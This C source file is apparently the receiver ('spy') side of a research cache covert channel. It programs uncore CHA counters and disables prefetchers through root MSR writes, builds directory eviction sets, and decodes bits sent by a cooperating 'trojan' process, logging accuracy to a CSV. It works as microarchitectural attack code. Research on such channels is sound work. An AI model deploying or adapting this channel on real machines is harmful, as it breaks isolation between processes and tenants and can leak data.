#include "cc_shared.h"

#define NALL   56
#define NCL0   28
#define CHA_BASE(c)  (0x2000UL + (c) * 0x10UL)
#define CTRL(c,i)    (CHA_BASE(c) + 0x2 + (i))
#define CTR(c,i)     (CHA_BASE(c) + 0x8 + (i))
#define UNIT_CTL(c)  (CHA_BASE(c) + 0x0)
#define GLOBAL_CTL   0x2FF0UL
#define RST_BOTH     0x300UL
#define PREFETCH_MSR 0x1A4UL

int node_cpu[4] = {1, 24, 48, 72};

static int fd0 = -1, pmfd = -1;
static uint8_t *BASE;
static size_t   BUFB = CC_BUFB;

static inline uint64_t rdmsr(uint64_t o){ uint64_t v=0; if(pread(fd0,&v,8,o)!=8)v=0; return v; }
static inline void     wrmsr(uint64_t o,uint64_t v){ if(pwrite(fd0,&v,8,o)!=8){} }
static uint64_t ctl(uint32_t ev,uint64_t um){ return (uint64_t)ev|((um&0xFF)<<8)|((um>>8)<<32); }
static inline void freeze(){ wrmsr(GLOBAL_CTL,1); }
static inline void run_(){ wrmsr(GLOBAL_CTL,0); }
static void prog(int nc){ wrmsr(GLOBAL_CTL,1);
    for(int c=0;c<nc;c++){ wrmsr(UNIT_CTL(c),RST_BOTH);
        wrmsr(CTRL(c,0),ctl(0x5f,0x1d));
        wrmsr(CTRL(c,1),ctl(0x5e,0x03)); }
}
static inline uint64_t hitc(int c){ return rdmsr(CTR(c,0)); }
static inline uint64_t lookc(int c){ return rdmsr(CTR(c,1)); }

static uint64_t baseL[NALL];

static int probe_home(volatile uint64_t*a){
    freeze(); for(int c=0;c<NALL;c++) baseL[c]=lookc(c); run_();
    cc_maccess(a); cc_mfence(); freeze();
    int best=-1; long bm=0;
    for(int c=0;c<NALL;c++){ long l=(long)(lookc(c)-baseL[c]); if(l>bm){bm=l;best=c;} }
    return bm>0?best:-1;
}

#define CR 14
static void classify(volatile uint64_t**ln,int n,int*home){
    static long acc[64][NALL];
    for(int i=0;i<n;i++) memset(acc[i],0,sizeof(long)*NALL);
    for(int r=0;r<CR;r++){
        cc_pin(node_cpu[1]); for(int i=0;i<n;i++) cc_maccess(ln[i]); cc_mfence();
        cc_pin(node_cpu[2]); for(int i=0;i<n;i++) cc_mwrite(ln[i]);  cc_mfence();
        cc_pin(node_cpu[0]);
        for(int i=0;i<n;i++){ (void)probe_home(ln[i]); run_();
            for(int c=0;c<NALL;c++) acc[i][c]+=(long)(lookc(c)-baseL[c]); }
        for(int i=0;i<n;i++){ cc_flush(ln[i]); } cc_mfence();
    }

    for(int i=0;i<n;i++){ int b1=-1; long m1=0,m2=0;
        for(int c=0;c<NALL;c++){ if(acc[i][c]>m1){m2=m1;m1=acc[i][c];b1=c;} else if(acc[i][c]>m2)m2=acc[i][c]; }
        home[i]= (m1>=CR/3 && m1>=1.8*m2) ? b1 : -1; }
}

static int pf[4]; static uint64_t ps[4];
static void prefetch_off(){ for(int d=0;d<4;d++){ char p[64]; snprintf(p,sizeof p,"/dev/cpu/%d/msr",node_cpu[d]); pf[d]=open(p,O_RDWR);
    if(pf[d]>=0&&pread(pf[d],&ps[d],8,PREFETCH_MSR)==8){ uint64_t v=0xF; ssize_t _=pwrite(pf[d],&v,8,PREFETCH_MSR); (void)_; } } }
static void prefetch_back(){ for(int d=0;d<4;d++) if(pf[d]>=0){ ssize_t _=pwrite(pf[d],&ps[d],8,PREFETCH_MSR); (void)_; close(pf[d]); } }

#define POOL_CAP 48
typedef struct { unsigned X; int CHA, n; uint64_t off[POOL_CAP]; } pool_t;
static int g_bucket[NALL];

static void pools_for_X(unsigned X, int cap, pool_t *p1, pool_t *p2) {
    size_t npg = BUFB/HUGE;
    static volatile uint64_t *cand[8192]; static int chome[8192]; int nc=0;
    for(size_t pg=1; pg<npg && nc<6000; pg++)
        for(int h=0; h<16 && nc<6000; h++)
            cand[nc++] = cc_line(BASE, cc_mkoff(pg, X, h));
    memset(g_bucket,0,sizeof g_bucket);
    for(int i=0;i<nc;i+=64){ int b=(nc-i<64)?nc-i:64; classify(cand+i,b,chome+i);
        for(int j=0;j<b;j++) if(chome[i+j]>=0 && chome[i+j]<NCL0) g_bucket[chome[i+j]]++; }
    int a=0; for(int c=1;c<NCL0;c++) if(g_bucket[c]>g_bucket[a]) a=c;
    int b=(a==0)?1:0; for(int c=0;c<NCL0;c++) if(c!=a && g_bucket[c]>g_bucket[b]) b=c;
    p1->X=X; p1->CHA=a; p1->n=0; p2->X=X; p2->CHA=b; p2->n=0;
    for(int i=0;i<nc;i++){
        if(chome[i]==a && p1->n<cap) p1->off[p1->n++]=(uint8_t*)cand[i]-BASE;
        else if(chome[i]==b && p2->n<cap) p2->off[p2->n++]=(uint8_t*)cand[i]-BASE;
    }
    fprintf(stderr,"[spy] X=0x%03x: top CHA%d=%d CHA%d=%d  (hist:",X,a,p1->n,b,p2->n);
    for(int c=0;c<NCL0;c++) if(g_bucket[c]>=6) fprintf(stderr," %d:%d",c,g_bucket[c]);
    fprintf(stderr,")\n");
}

static void keep_best(pool_t *best, pool_t *cand) {
    for(int k=0;k<2;k++) if(best[k].n==cand->n && best[k].X==cand->X && best[k].CHA==cand->CHA) return;
    int same0 = (best[0].n && best[0].X==cand->X && best[0].CHA==cand->CHA);
    int same1 = (best[1].n && best[1].X==cand->X && best[1].CHA==cand->CHA);
    if(same0){ if(cand->n>best[0].n) best[0]=*cand; return; }
    if(same1){ if(cand->n>best[1].n) best[1]=*cand; }
    if(cand->n>best[1].n) best[1]=*cand;
    if(best[1].n>best[0].n){ pool_t t=best[0]; best[0]=best[1]; best[1]=t; }
}

static int select_two_sets(int need, pool_t *A, pool_t *B) {
    static const unsigned Xs[] = {0x155,0x2AA,0x0AA,0x1AA,0x255,0x0D5,0x2A8,0x158};
    pool_t best[2]; memset(best,0,sizeof best);
    for(int xi=0; xi<(int)(sizeof(Xs)/sizeof(Xs[0])); xi++){
        pool_t p1,p2; pools_for_X(Xs[xi], POOL_CAP, &p1, &p2);
        keep_best(best,&p1); keep_best(best,&p2);
        if(best[0].n>=need && best[1].n>=need){
            fprintf(stderr,"[spy] enough after %d X-sweeps\n",xi+1); break; }
    }
    *A=best[0]; *B=best[1];
    return (A->n>=2 && B->n>=2);
}

static long probe_hits(volatile uint64_t **lines, int n, int H){
    cc_pin(node_cpu[0]);
    freeze(); uint64_t b=hitc(H); run_();
    for(int i=0;i<n;i++){ cc_maccess(lines[i]); } cc_mfence();
    freeze(); long d=(long)(hitc(H)-b); run_();
    return d;
}

static int verify_members(uint64_t *off, int n, int H, int Efld, uint64_t *out){
    int m=0, TR=6;
    volatile uint64_t *T, *fld[POOL_CAP];
    for(int i=0;i<n;i++){
        T=cc_line(BASE,off[i]);
        int nf=0; for(int j=0;j<n && nf<Efld;j++) if(j!=i) fld[nf++]=cc_line(BASE,off[j]);
        int surv=0;
        for(int t=0;t<TR;t++){
            cc_flush(T); for(int k=0;k<nf;k++) cc_flush(fld[k]); cc_mfence();
            cc_ALLOC(T);
            cc_ALLOC_batch(fld,nf);
            if(probe_hits(&T,1,H) > 0) surv++;
        }
        if((double)surv/TR <= 0.4) out[m++]=off[i];
    }
    return m;
}

static volatile cc_ctrl *C;
static int wait_flag(volatile int *f,int ms){ long dl=cc_now_ms()+ms,sp=0;
    for(;;){ cc_barrier(); if(*f) return 0;
        if((++sp&0xffff)==0){ sched_yield(); if(cc_now_ms()>dl) return -1; } } }
static int wait_phase(int want,long win,int ms){ long dl=cc_now_ms()+ms,sp=0;
    for(;;){ cc_barrier(); if(C->stop) return -1; if(C->phase==want&&C->win==win) return 0;
        if((++sp&0xffff)==0){ sched_yield(); if(cc_now_ms()>dl) return -2; } } }

int main(int argc,char**argv){
    int W = argc>1?atoi(argv[1]):2;
    int E = argc>2?atoi(argv[2]):8;
    const char *payload = argc>3?argv[3]:"01101001";
    int R = argc>4?atoi(argv[4]):16;
    if(W>CC_MAXW) W=CC_MAXW;
    if(E>CC_MAXW) E=CC_MAXW;
    if(R<1) R=1;

    fd0=open("/dev/cpu/0/msr",O_RDWR); if(fd0<0){perror("open msr (run as root, server stopped)");return 1;}
    pmfd=open("/proc/self/pagemap",O_RDONLY);

    unlink(CC_SHM_PATH);
    BASE=cc_map_shared(BUFB,1); if(!BASE){return 2;}
    C=(volatile cc_ctrl*)BASE;
    memset((void*)C,0,sizeof(cc_ctrl));

    prefetch_off();
    prog(NALL); run_();

    int Npre=32, Npay=(int)strlen(payload);
    if(Npre+Npay>CC_MAXBITS) Npay=CC_MAXBITS-Npre;
    unsigned char *bits=malloc(Npre+Npay);
    for(int i=0;i<Npre;i++) bits[i]=i&1;
    for(int i=0;i<Npay;i++) bits[Npre+i]= (payload[i]=='1')?1:0;
    int nbits=Npre+Npay;

    pool_t A,B;
    if(!select_two_sets(W+E,&A,&B)){
        fprintf(stderr,"[spy] could not find two usable MD sets\n"); return 3; }

    uint64_t va[POOL_CAP], vb[POOL_CAP];
    int efa=(A.n-1<12?A.n-1:12), efb=(B.n-1<12?B.n-1:12);
    int nva=verify_members(A.off,A.n,A.CHA,efa,va);
    int nvb=verify_members(B.off,B.n,B.CHA,efb,vb);
    fprintf(stderr,"[spy] verified true members: transmission %d/%d (CHA%d)  boundary %d/%d (CHA%d)\n",
            nva,A.n,A.CHA,nvb,B.n,B.CHA);
    memcpy(A.off,va,nva*sizeof(uint64_t)); A.n=nva;
    memcpy(B.off,vb,nvb*sizeof(uint64_t)); B.n=nvb;

    int cap = (A.n<B.n?A.n:B.n);
    if(W+E>cap){ E=cap-W; if(E<2){ W=2; E=cap-2; } }
    if(W<1||E<1||W+E>cap){ fprintf(stderr,"[spy] pools too small (A=%d B=%d)\n",A.n,B.n); return 3; }
    int Ht=A.CHA, Hb=B.CHA; unsigned Xt=A.X, Xb=B.X;
    uint64_t *offt=A.off, *offb=B.off;
    fprintf(stderr,"[spy] SETS: transmission X=0x%x CHA%d (%d) | boundary X=0x%x CHA%d (%d) | W=%d E=%d R=%d\n",
            Xt,Ht,A.n,Xb,Hb,B.n,W,E,R);

    C->W=W; C->E=E; C->R=R; C->mode=0; C->use_bd=1;
    C->home_t=Ht; C->home_b=Hb; C->Xt=Xt; C->Xb=Xb;
    for(int i=0;i<W;i++){ C->spy_tx[i]=offt[i];    C->spy_bd[i]=offb[i]; }
    for(int i=0;i<E;i++){ C->troj_tx[i]=offt[W+i]; C->troj_bd[i]=offb[W+i]; }
    C->nbits=nbits; memcpy((void*)C->bits,bits,nbits);
    cc_mfence(); C->magic=CC_MAGIC; C->spy_ready=1; cc_mfence();

    volatile uint64_t *stx[CC_MAXW], *sbd[CC_MAXW];
    for(int i=0;i<W;i++){ stx[i]=cc_line(BASE,C->spy_tx[i]); sbd[i]=cc_line(BASE,C->spy_bd[i]); }

    fprintf(stderr,"[spy] waiting for trojan_ready...\n");
    if(wait_flag(&C->trojan_ready,120000)!=0){ fprintf(stderr,"[spy] no trojan\n"); return 4; }
    fprintf(stderr,"[spy] trojan up — starting transmission (W=%d E=%d, %d bits)\n",W,E,nbits);
    C->go=1; cc_mfence();

    long *txh=calloc(nbits,sizeof(long)), *bdh=calloc(nbits,sizeof(long));

    for(long w=0; w<nbits; w++){
        long tsum=0, bsum=0; int broke=0;
        for(int r=0; r<R; r++){
            long win = w*(long)R + r;
            cc_RESET_batch(stx,W); cc_RESET_batch(sbd,W);
            cc_ALLOC_batch(stx,W); cc_ALLOC_batch(sbd,W);
            C->win=win; cc_mfence(); C->phase=CC_PRIMED; cc_mfence();
            if(wait_phase(CC_SENT,win,20000)!=0){ fprintf(stderr,"[spy] lost sync at bit %ld r%d\n",w,r); broke=1; break; }
            tsum += probe_hits(stx,W,Ht);
            bsum += probe_hits(sbd,W,Hb);
            C->phase=CC_PROBED; cc_mfence();
            if(wait_phase(CC_READY,win,20000)!=0){ broke=1; break; }
        }
        txh[w]=tsum; bdh[w]=bsum;
        if(broke) break;
    }
    C->stop=1; cc_mfence();

    #define ABSD(x) ((x)<0?-(x):(x))
    double s0=0,s1=0; int n0=0,n1=0;
    for(int w=0;w<Npre;w++){ if(bits[w]){ s1+=txh[w]; n1++; } else { s0+=txh[w]; n0++; } }
    double m0 = n0?s0/n0:0, m1 = n1?s1/n1:0;
    double thr = (m0+m1)/2.0;
    fprintf(stderr,"[spy] calib: mean HITME_HIT  bit0(survive)=%.2f  bit1(evict)=%.2f  -> thr=%.2f  gap=%.2f\n",
            m0,m1,thr,ABSD(m0-m1));
    #define DECODE(w) ( ABSD((double)txh[w]-m1) < ABSD((double)txh[w]-m0) ? 1 : 0 )

    int okp=0; for(int i=0;i<Npay;i++){ int w=Npre+i; if(DECODE(w)==bits[w])okp++; }
    int okall=0; for(int w=0;w<nbits;w++){ if(DECODE(w)==bits[w])okall++; }

    char dbuf[CC_MAXBITS+1];
    for(int i=0;i<Npay;i++){ int w=Npre+i; dbuf[i]=DECODE(w)?'1':'0'; } dbuf[Npay]=0;
    fprintf(stderr,"[spy] payload sent   = %.*s\n",Npay,payload);
    fprintf(stderr,"[spy] payload decoded= %s\n",dbuf);
    fprintf(stderr,"[spy] accuracy: payload %d/%d = %.1f%%   all %d/%d = %.1f%%\n",
            okp,Npay,100.0*okp/Npay, okall,nbits,100.0*okall/nbits);

    mkdir("output",0755); mkdir("output/current",0755);
    FILE *f=fopen("output/current/covert_trace.csv","w");
    if(f){ fprintf(f,"win,phase,bit_true,tx_hits,bd_hits,bit_decoded,thr,W\n");
        for(int w=0;w<nbits;w++){ const char*ph=(w<Npre)?"preamble":"payload";
            fprintf(f,"%d,%s,%d,%ld,%ld,%d,%.3f,%d\n",w,ph,bits[w],txh[w],bdh[w],DECODE(w),thr,W); }
        fclose(f); fprintf(stderr,"[spy] wrote output/current/covert_trace.csv\n"); }

    prefetch_back();
    return 0;
}
